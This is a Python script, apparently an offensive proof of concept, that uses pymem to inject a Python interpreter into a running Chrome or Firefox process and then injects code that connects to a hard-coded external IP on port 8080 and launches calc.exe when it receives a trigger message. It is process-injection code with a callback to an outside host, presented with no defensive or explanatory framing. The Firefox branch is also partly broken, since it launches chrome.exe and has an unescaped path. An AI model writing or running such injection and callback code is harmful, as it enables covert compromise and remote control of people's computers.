from pymem import Pymem
import pymem
import os
import subprocess
from time import sleep

def chromecheck():
    global chromeexists
    if os.path.exists("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe") == True:
        return True
    else:
        return False

def firefoxcheck():
    global firefoxexists
    if os.path.exists("C:\\Program Files\\Mozilla Firefox\\firefox.exe") == True:
        return True
    else:
        return False

def is_chrome_running():
    try:
        result = subprocess.run(['tasklist', '/FI', 'IMAGENAME eq chrome.exe'], capture_output=True, text=True)
        return 'chrome.exe' in result.stdout
    except Exception as e:
        print(f"Error checking for Chrome processes: {e}")
        return False
    
def is_firefox_running():
    try:
        result = subprocess.run(['tasklist', '/FI', 'IMAGENAME eq firefox.exe'], capture_output=True, text=True)
        return 'firefox.exe' in result.stdout
    except Exception as e:
        print(f"Error checking for firefox processes: {e}")
        return False
    
if chromecheck():
    if is_chrome_running():
        print("Chrome is running. Injecting...")
        chrome = [
        'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
        '--headless',
        '--disable-gpu',
        '--disable-software-rasterizer'
        ]
        chromeproc = subprocess.Popen(chrome)
        pm = pymem.Pymem('chrome.exe')
        print("Injected.")
    else:
        print("Chrome is not running. Starting chrome")
        url = 'https://www.google.com'
        chrome_path = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'
        chrome = [chrome_path, url]
        chromeproc = subprocess.Popen(chrome)
        pm = pymem.Pymem('chrome.exe')
        print("Injected.")
else:
    if firefoxcheck():
        if is_firefox_running():
            print("Firefox is running. Injecting...")
            firefox = [
                'C:\Program Files\Mozilla Firefox\firefox.exe',
                '-headless'
            ]
            firefox_proc = subprocess.Popen(firefox)
            pm = pymem.Pymem('firefox.exe')
            print("Injected.")
        else:
            print("Firefox is not running. Starting firefox")
            url = 'https://www.google.com'
            firefox_path = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'
            firefox = [firefox_path, url]
            chromeproc = subprocess.Popen(firefox)
            pm = pymem.Pymem('firefox.exe')
            print("Injected.")

pm.inject_python_interpreter()

shellcode = """
import socket
import subprocess
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ('147.182.247.60', 8080)
client_socket.connect(server_address)
try:
    data = client_socket.recv(1024)
    if data == b'hey':
        subprocess.Popen(['calc.exe'])
        print('bab')
    print(f"Received message from server: {data}")
finally:
    client_socket.close()
"""
pm.inject_python_shellcode(shellcode)

exit()
